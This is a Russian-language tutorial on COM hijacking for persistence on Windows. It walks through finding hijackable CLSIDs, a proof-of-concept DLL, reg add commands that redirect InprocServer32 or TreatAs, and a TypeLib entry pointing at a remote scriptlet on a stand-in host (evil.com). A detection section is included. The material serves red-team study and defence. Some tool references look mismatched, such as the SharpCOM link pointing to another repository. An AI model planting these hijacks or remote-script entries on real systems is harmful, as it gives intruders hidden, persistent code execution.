# COM Hijacking: закрепление на Windows-хосте

## 1. Контекст и базовые понятия

Component Object Model (COM) — это бинарный стандарт взаимодействия программных компонентов, появившийся в Windows 3.11 и ставший фундаментом для технологий ActiveX, DCOM, OLE и многих подсистем пользовательского интерфейса. В контексте пост-эксплуатации COM интересен не как средство межпроцессного взаимодействия, а как механизм, который операционная система использует для загрузки кода в адресное пространство доверенных процессов — `explorer.exe`, `rundll32.exe`, `svchost.exe` и других. Манипулируя реестровыми ссылками на COM-классы, атакующий может заставить легитимный процесс загрузить вредоносную DLL и выполнить её код — без создания новых процессов, служб или элементов автозагрузки, которые легко отслеживаются современными EDR.

Ключевой идентификатор COM-класса — **CLSID** (Class Identifier), 128-битный GUID, однозначно определяющий реализацию объекта. Каждый COM-класс может поддерживать несколько интерфейсов, идентифицируемых **IID** (Interface Identifier), а для удобства разработчиков используется строковый синоним **ProgID** (например, `Word.Application`), который преобразуется в CLSID через реестр. Путь к исполняемому серверу (DLL или EXE) хранится в подключе `InprocServer32` для внутрипроцессных серверов или `LocalServer32` — для внепроцессных. Именно эти подключи и становятся точкой перехвата.

Штатный сценарий загрузки COM-объекта инициируется вызовом `CoCreateInstance` (или `CoGetClassObject`) в клиентском процессе. Библиотека `OLE32.DLL` выполняет поиск CLSID в реестре, начиная с виртуального корня `HKCR` (HKEY_CLASSES_ROOT), который является объединением `HKCU\Software\Classes` и `HKLM\Software\Classes`. Реализация `RegOpenKeyEx` в COM гарантирует, что значения из HKCU проверяются **раньше**, чем из HKLM. Следовательно, если злоумышленник, обладающий правами на запись в пользовательский куст реестра (что доступно по умолчанию без повышения привилегий), создаст в `HKCU\Software\Classes\CLSID\{Target-GUID}\InprocServer32` ссылку на свою DLL, то при следующем обращении любого процесса к этому CLSID будет загружена именно она, а не легитимная DLL из HKLM.

Этот метод не является ошибкой в коде COM, а представляет собой злоупотребление изначально заложенной гибкостью переопределения классов для отдельных пользователей. Аналогичный принцип работы используется в технике «ProgID hijacking», но COM hijacking тоньше: он не требует изменения ассоциаций файлов и срабатывает при гораздо более широком спектре действий — от отрисовки значков до обновления фоновых задач проводника, что обеспечивает стабильное и частое выполнение полезной нагрузки.

Для систематизации места COM hijacking среди других методов закрепления на Windows-хосте полезна сравнительная таблица.

| Метод закрепления | Требование прав администратора | Стелс (порождает ли новый процесс) | Механизм триггера | Типичные индикаторы |
|-------------------|-------------------------------|-------------------------------------|-------------------|---------------------|
| Run-ключи реестра (`Software\Microsoft\Windows\CurrentVersion\Run`) | Нет (HKCU) / Да (HKLM) | Да, запускает процесс при входе пользователя | Запуск пользовательской сессии | Процесс-сирота, записи в autorun-ключах |
| Windows-службы | Да (создание) | Да, процесс-служба запускается при старте системы | Загрузка ОС, запуск Service Control Manager | Новая служба, нестандартный бинарный путь |
| Планировщик заданий | Зависит от контекста выполнения (можно без прав админа) | Да, запускает процесс по триггеру | Время, событие, вход пользователя | Нестандартные задания, детектируемые по логам Task Scheduler |
| DLL Search Order Hijacking | Нет (запись в пользовательские каталоги) | Нет, вредоносный код загружается в легитимный процесс | Запуск уязвимого приложения | Загрузка DLL из нестандартного пути, сигнатуры AppInit_DLLs |
| **COM Hijacking (InprocServer32)** | **Нет (HKCU)** | **Нет, DLL загружается в контексте вызывающего процесса** | **Вызов COM-объекта системными или пользовательскими процессами** | **Нестандартные CLSID-записи в HKCU, загрузка DLL без цифровой подписи в доверенный процесс** |

Отсутствие дочернего процесса — ключевое преимущество COM hijacking. EDR, полагающиеся на анализ дерева процессов, не видят подозрительного запуска; им приходится анализировать загрузку образов в память уже работающих процессов, что сложнее и ресурсоёмкие. Кроме того, метод не требует административных привилегий, что расширяет поверхность атаки до любого пользовательского контекста.

Типичным для первоначального ознакомления является просмотр структуры реестра для какого-либо COM-класса. Например, запрос к легитимному классу Internet Explorer через `reg query`:

```powershell
reg query "HKLM\Software\Classes\CLSID\{0002DF01-0000-0000-C000-000000000046}\InprocServer32" /s
```

Вывод покажет путь к `ieframe.dll`, версию и модель потоков. Именно эти значения будут «теневыми» переопределены в HKCU атакующим. Понимание этой иерархии позволяет перейти к детальному разбору механизма перехвата.

## 2. Внутреннее устройство и поиск уязвимых ключей

COM hijacking эксплуатирует поиск COM-серверов, реализованный в `OLE32.DLL`. После вызова `CoCreateInstance` внутренняя функция `CClassCache::CDllPathEntry::DllGetClassObject` запрашивает путь к серверу через `COM_OpenKeyForCLSID`, которая, в свою очередь, обращается к реестру в следующем порядке:

1. **HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32** (если процесс работает в контексте пользователя и не является elevated).
2. **HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32**.
3. Дополнительные пути, если используются перенаправления (например, `TreatAs`).

Для elevated-процессов (с высоким уровнем целостности) приоритет HKCU игнорируется: COM-подсистема безопасности принудительно ищет серверы только в HKLM, чтобы предотвратить атаки повышения привилегий. Это ограничивает hijacking пользовательскими процессами, но не снижает его ценность, так как целевые процессы вроде `explorer.exe` как раз и работают со средним уровнем целостности.

Кроме `InprocServer32`, в качестве точки перехвата могут использоваться другие подключи:

- **LocalServer32** — указывает на исполняемый файл для внепроцессного COM-сервера. Модификация может привести к запуску произвольного EXE при обращении к COM-объекту.
- **TreatAs** — позволяет подменить CLSID другим идентификатором. Если в HKCU указать TreatAs, ссылающийся на другой вредоносный CLSID, загрузка пойдёт по новому пути.
- **ProgID** — переопределение ProgID в HKCU перенаправляет все запросы к имени класса на другой CLSID, что даёт ещё один вектор атаки.
- **TypeLib** — хранит путь к библиотеке типов; модификация ключа `TypeLib` с использованием префикса `script:` позволяет выполнять удалённые скрипты (обнаружено в инцидентах ReliaQuest в 2025 году).

Таким образом, злоумышленнику не нужно искать уязвимость в конкретном COM-объекте; достаточно найти CLSID, который **ещё не определён в HKCU** и используется целевыми процессами. Эта задача автоматизируется с помощью Process Monitor (ProcMon) и специализированных скриптов. ProcMon позволяет выявить обращения к отсутствующим ключам `InprocServer32`, `LocalServer32` и другим — те, что возвращают `NAME NOT FOUND` при попытке открытия в HKCU, но существуют в HKLM.

Типичная конфигурация фильтров ProcMon для поиска потенциальных целей:

```text
Operation  is  RegOpenKey
Result     is  NAME NOT FOUND
Path       ends with  InprocServer32
Path       excludes  HKLM
```

После непродолжительной работы системы (открытия папок, запуска приложений) ProcMon регистрирует сотни таких событий. Например, классы, используемые оболочкой Explorer для отрисовки иконок, эскизов или контекстных меню, практически гарантированно будут вызваны при входе пользователя, что делает их идеальными кандидатами для закрепления.

Для массового извлечения пригодных для перехвата CLSID можно сохранить лог ProcMon в CSV и обработать его с помощью PowerShell-скрипта `acCOMplice` (разработан David Tulis):

```powershell
Import-Module .\acCOMplice.ps1
Extract-HijackableKeysFromProcmonCSV -CSVfile .\Logfile.CSV
```

Скрипт фильтрует ключи, не требующие административных привилегий и отсутствующие в HKCU. Альтернативный метод — прямое перечисление COM-настроек через WMI, как показал Бохопс (bohops). Следующий однострочник соберёт значения `LocalServer32` всех зарегистрированных COM-классов и проверит наличие указанных файлов на диске:

```powershell
$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
$inproc | ForEach {$_.LocalServer32} > values.txt
$paths = gc .\values.txt
foreach ($p in $paths){$p; cmd /c dir $p > $null}
```

Если `dir` возвращает ошибку «File Not Found», значит, файл сервера отсутствует, но CLSID всё ещё зарегистрирован. Такой класс можно «оживить», разместив свой исполняемый файл по указанному пути, или перехватить через тот же `InprocServer32` в HKCU.

Для наглядности иерархия поиска COM-серверов представлена схемой:

```text
CoCreateInstance(CLSID)
      |
      v
OLE32!COM_OpenKeyForCLSID
      |
      +--[Запрос HKCU\...\InprocServer32] --(найден)--> Загрузка DLL из HKCU
      |         |
      |        (не найден)
      |         |
      +--[Запрос HKLM\...\InprocServer32] --(найден)--> Загрузка DLL из HKLM
                |
              (не найден)
                |
                v
              Ошибка REGDB_E_CLASSNOTREG
```

По данным [MITRE ATT&CK T1546.015](https://attack.mitre.org/techniques/T1546/015), в реальных атаках APT28 использовала COM hijacking для подмены объекта `MMDeviceEnumerator`, а вредоносная программа ADVSTORESHELL регистрировалась как обработчик наложения иконок (Shell Icon Overlay Handler), что вызывало её загрузку при каждом обновлении значков в проводнике. Разнообразие векторов показывает, что атакующий не ограничен одним типом сервера: выбор между InprocServer32, LocalServer32 или TypeLib зависит от требуемой скрытности и желаемого механизма исполнения.

Знание архитектуры поиска позволяет не только осуществлять hijacking, но и грамотно выстраивать защиту: мониторинг событий реестра с фокусом на создание подключей `InprocServer32` в HKCU и отсутствующих в базе легитимных образов DLL является эффективным методом обнаружения. Об этом пойдёт речь в следующем разделе.

## 3. Применение и работа с COM hijacking

Практическая реализация COM hijacking состоит из трёх этапов: выбор цели, создание полезной нагрузки и внесение изменений в реестр. Рассмотрим каждый из них с примерами кода и инструментов.

### 3.1 Выбор целевого CLSID

Автоматизация поиска, описанная в предыдущем разделе, может быть дополнена ручной проверкой. Важно выбирать классы, которые:
- часто вызываются нужным процессом (проверяется через ProcMon с фильтром по процессу `explorer.exe`);
- не нарушают работу системы в случае некорректной подмены (избегать критических объектов вроде `MMDeviceEnumerator`, если не планируется аккуратная прокси-реализация);
- не имеют существующей записи в HKCU.

Пример скрипта PowerShell для перечисления CLSID, у которых `InprocServer32` определён в HKLM, но отсутствует в HKCU:

```powershell
$clsidRoot = "HKLM:\Software\Classes\CLSID"
Get-ChildItem -Path $clsidRoot | ForEach-Object {
    $clsid = $_.PSChildName
    $inprocPath = "$clsidRoot\$clsid\InprocServer32"
    if (Test-Path $inprocPath) {
        $hklmDll = (Get-ItemProperty $inprocPath)."(default)"
        $hkcuPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
        if (-not (Test-Path $hkcuPath)) {
            [PSCustomObject]@{
                CLSID = $clsid
                CurrentDll = $hklmDll
            }
        }
    }
}
```

Вывод скрипта содержит список CLSID, пригодных для Hijacking. Следующий шаг — разработка DLL.

### 3.2 Создание вредоносного COM-сервера

Минимальная DLL для COM hijacking должна экспортировать функции `DllGetClassObject`, `DllCanUnloadNow` и, опционально, `DllRegisterServer`/`DllUnregisterServer`. Однако для базового выполнения кода достаточно реализовать `DllGetClassObject`, которая вызывается сразу после загрузки библиотеки. Типичная полезная нагрузка может запускать новый поток, выполнять команду или просто выводить отладочное сообщение.

Пример DLL на языке C с экспортом через файл `.def`:

```c
// malicious_com.cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Полезная нагрузка при загрузке: например, создание процесса или запись в лог
        // В иллюстрационных целях — MessageBox (только для отладки)
        MessageBoxA(NULL, "COM Hijacking PoC", "Loaded in process", MB_OK);
    }
    return TRUE;
}

HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    // Обязательная заглушка: возвращаем CLASS_E_CLASSNOTAVAILABLE,
    // чтобы потребитель COM не ждал реальной функциональности
    return CLASS_E_CLASSNOTAVAILABLE;
}

HRESULT __stdcall DllCanUnloadNow(void) {
    return S_FALSE; // предотвращаем выгрузку для персистентности
}
```

Файл определения экспорта `malicious_com.def`:

```text
LIBRARY malicious_com.dll
EXPORTS
    DllGetClassObject    @1
    DllCanUnloadNow      @2
```

Сборка производится компилятором MSVC или MinGW. Готовая DLL размещается в защищённом каталоге на диске, доступном пользователю (например, `C:\Users\Public\Documents\malicious.dll`).

В более сложных сценариях применяется техника COM-проксирования (proxying): вредоносная DLL загружает оригинальный системный сервер и перенаправляет вызовы, чтобы не нарушать функциональность. Это требует значительных усилий, но минимизирует заметность для пользователя и приложений.

### 3.3 Модификация реестра

Запись значения `InprocServer32` в HKCU осуществляется командой `reg add`, не требующей прав администратора:

```powershell
reg add "HKCU\Software\Classes\CLSID\{Target-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\Documents\malicious.dll" /f
```

Для поддержки многопоточности можно добавить значение `ThreadingModel`:

```powershell
reg add "HKCU\Software\Classes\CLSID\{Target-GUID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
```

Аналогично осуществляется перенаправление через `LocalServer32` или `TreatAs`. Например, создание ссылки TreatAs на другой CLSID:

```powershell
reg add "HKCU\Software\Classes\CLSID\{Target-GUID}\TreatAs" /ve /t REG_SZ /d "{Second-GUID}" /f
```

В случае TypeLib hijacking, задействуется ключ `TypeLib` с псевдонимом `script:` для выполнения скриптлетов:

```powershell
reg add "HKCU\Software\Classes\CLSID\{Target-GUID}\TypeLib" /ve /t REG_SZ /d "script:http://evil.com/payload.sct" /f
```

Здесь используется технология Windows Script Components (SCT), позволяющая выполнять JScript или VBScript без загрузки DLL. Подобный вектор наблюдался в атаках группы, обозначаемой ReliaQuest как «STAC5777», применявшей TypeLib hijacking для доставки бэкдоров в финансовые организации.

Для автоматизации многие специалисты по красной команде используют утилиту [SharpCOM](https://github.com/nccgroup/acCOMplice) (или её аналоги), которая одной командой создаёт записи реестра и даже генерирует шаблонную DLL. Пример вызова:

```powershell
SharpCOM.exe hijack -c {CLSID} -d "C:\path\to\malicious.dll" -m InprocServer32
```

### 3.4 Обнаружение и противодействие

С точки зрения обороняющейся стороны, COM hijacking оставляет несколько характерных индикаторов:
- Создание подключей `InprocServer32`, `LocalServer32`, `TreatAs`, `TypeLib` в ветке `HKCU\Software\Classes\CLSID\`. Легитимные приложения крайне редко прописывают COM-серверы в пользовательском кусте.
- Загрузка неподписанных библиотек из подозрительных каталогов (`Users\Public`, `Temp`, `AppData\Roaming`) в процессы, которые обычно грузят системные DLL.
- События Sysmon (Event ID 12, 13) — создание/изменение ключей реестра, либо Event ID 7 (загрузка образа) с флагом `Image=*.dll`, загружаемой в процесс с подозрительным исходным каталогом.
- Событие Windows Security Event 4657 (Audit Registry Value Modification) при включении соответствующей политики аудита.

Мониторинг этих артефактов может выливаться в высокий уровень ложных срабатываний, поэтому рекомендуется создание базовых линий легитимного поведения в инфраструктуре и корреляция с контекстом процесса-инициатора (например, редко кто-то, кроме инсталляций, пишет в CLSID). Инструменты вроде Autoruns способны выявлять подозрительные ссылки COM-объектов, но полагаться только на них нельзя — TypeLib hijacking через `script:` они не распознают.

Таким образом, COM hijacking остаётся мощной техникой закрепления, эффективной против большинства EDR при условии грамотного выбора цели и заботы о стабильности перехваченного объекта. Практический пример ниже продемонстрирует полную цепочку от поиска до загрузки.

## 4. Сквозной практический пример: перехват Shell Icon Overlay Handler

**Исходные условия:** Лабораторная машина Windows 10 22H2, учётная запись стандартного пользователя `labuser`, цель — обеспечить выполнение произвольного кода в контексте `explorer.exe` при открытии любой папки. Инструменты: ProcMon, компилятор MinGW, reg.exe, Sysinternals Process Explorer. Сценарий основан на методе, использованном вредоносной программой ADVSTORESHELL и задокументированном ESET.

### Шаг 1: Поиск подходящего CLSID

Запускаем ProcMon с описанными ранее фильтрами и в течение минуты выполняем обычные действия: открываем и закрываем папки, обновляем рабочий стол. В результирующем логе находим событие обращения к ключу `InprocServer32`, отсутствующему в HKCU, для процесса `explorer.exe`. Для демонстрации возьмём CLSID `{D6D6E6E4-...}` (реальное значение зависит от окружения; в иллюстративных целях будем использовать `{Target-ShellIcon-GUID}`). Убеждаемся, что этот класс используется для расширения значков.

```text
ProcMon captured event:
Time: 14:05:23.0123456
Operation: RegOpenKey
Result: NAME NOT FOUND
Path: HKCU\Software\Classes\CLSID\{Target-ShellIcon-GUID}\InprocServer32
Process: explorer.exe (PID 4096)
```

Или через PowerShell-скрипт получаем подтверждение:

```powershell
Get-ItemProperty "HKLM:\Software\Classes\CLSID\{Target-ShellIcon-GUID}\InprocServer32"
# Вывод:
# (default) : C:\Windows\system32\imageres.dll
```

В HKCU данный ключ отсутствует — идеальная цель.

### Шаг 2: Создание DLL

Пишем DLL, минимально экспортирующую `DllGetClassObject` и `DllCanUnloadNow`. Для демонстрации используем отладочный вывод в DebugView, а не MessageBox, чтобы избежать интерактивного окна, которое может нарушить тестирование.

Исходный код `hijack_com.c`:

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Выполняем полезную нагрузку, например, пишем в файл
        FILE *fp = fopen("C:\\Users\\Public\\com_hijack_log.txt", "a");
        if (fp) {
            fprintf(fp, "DLL loaded at %d\n", GetTickCount());
            fclose(fp);
        }
    }
    return TRUE;
}

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    return CLASS_E_CLASSNOTAVAILABLE;
}

STDAPI DllCanUnloadNow(void) {
    return S_FALSE;
}
```

Компиляция командой:

```bash
x86_64-w64-mingw32-gcc -shared -o malicious.dll hijack_com.c -Wl,--output-def,malicious.def
```

Полученный файл `malicious.dll` размещаем в `C:\Users\Public\malicious.dll`.

### Шаг 3: Модификация реестра

Создаём запись в HKCU командой:

```powershell
reg add "HKCU\Software\Classes\CLSID\{Target-ShellIcon-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\malicious.dll" /f
```

Проверяем, что ключ появился:

```powershell
reg query "HKCU\Software\Classes\CLSID\{Target-ShellIcon-GUID}\InprocServer32"
```

Ожидаемый вывод:

```text
HKEY_CURRENT_USER\Software\Classes\CLSID\{Target-ShellIcon-GUID}\InprocServer32
    (Default)    REG_SZ    C:\Users\Public\malicious.dll
```

### Шаг 4: Триггер и верификация

Выходим из системы и входим заново, либо принудительно перезапускаем процесс `explorer.exe` (без завершения сеанса – например, через Task Manager). При загрузке рабочего стола проводник запрашивает все обработчики значков, включая подменённый CLSID. COM-рантайм находит запись в HKCU и загружает `malicious.dll` в адресное пространство `explorer.exe`.

Проверка загрузки через Process Explorer: в свойствах процесса `explorer.exe` на вкладке Threads или DLL ищем `malicious.dll`. Альтернативно — смотрим содержимое лог-файла:

```powershell
type C:\Users\Public\com_hijack_log.txt
```

Вывод подтверждает, что функция `DllMain` отработала:

```text
DLL loaded at 1723456789
DLL loaded at 1723459901
```

На этом этапе злоумышленник может заменить полезную нагрузку на более агрессивную: загрузчик бэкдора или непосредственно шелл-код. Поскольку `explorer.exe` запущен с правами текущего пользователя, процесс наследует все его сессионные токены и сетевые доступы, что достаточно для большинства задач закрепления.

**Вывод примера:** COM hijacking позволил без создания новых процессов и без повышения привилегий добиться выполнения произвольного кода в контексте надёжного системного процесса при каждой загрузке графической оболочки. Атака не требовала эксплойтов или уязвимости в CLSID — исключительно знания архитектуры COM и прав на запись в свою же ветку реестра. Пример демонстрирует жизнеспособность техники и её опасность для организаций, не настроивших углублённый мониторинг реестровых операций.

## 5. Источники

- [MITRE ATT&CK: T1546.015 — Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015)
- [Cyber Ask Ltd — Analyzing COM Object Hijacking for Persistence Mechanisms](https://cyberask.co.uk/posts/analyzing-com-object-hijacking-for-persistence-mechanisms.html)
- [The Art of Windows Persistence — elhacker.INFO (PDF overview)](https://elhacker.info/manuales/Hacking%20y%20Seguridad%20informatica/The%20Art%20of%20Windows%20Persistence.pdf)
- [PentestLab — Persistence – COM Hijacking](https://pentestlab.blog/2020/05/20/persistence-com-hijacking)
- [ReliaQuest — Threat Spotlight: Hijacked and Hidden: New Backdoor and Persistence Technique](https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique)
- [CyberArk — Persistence Techniques That Persist](https://www.cyberark.com/resources/threat-research-blog/persistence-techniques-that-persist)
- [Packetlabs — COM Hijacking and Proxying for Userland Persistence in Red Teams](https://www.packetlabs.net/posts/com-hijacking-proxying)

## Источники

- https://attack.mitre.org/techniques/T1546/015
- https://cyberask.co.uk/posts/analyzing-com-object-hijacking-for-persistence-mechanisms.html
- https://pentestlab.blog/2020/05/20/persistence-com-hijacking
- https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique
- https://www.cyberark.com/resources/threat-research-blog/persistence-techniques-that-persist
- https://www.packetlabs.net/posts/com-hijacking-proxying
- https://elhacker.info/manuales/Hacking%20y%20Seguridad%20informatica/The%20Art%20of%20Windows%20Persistence.pdf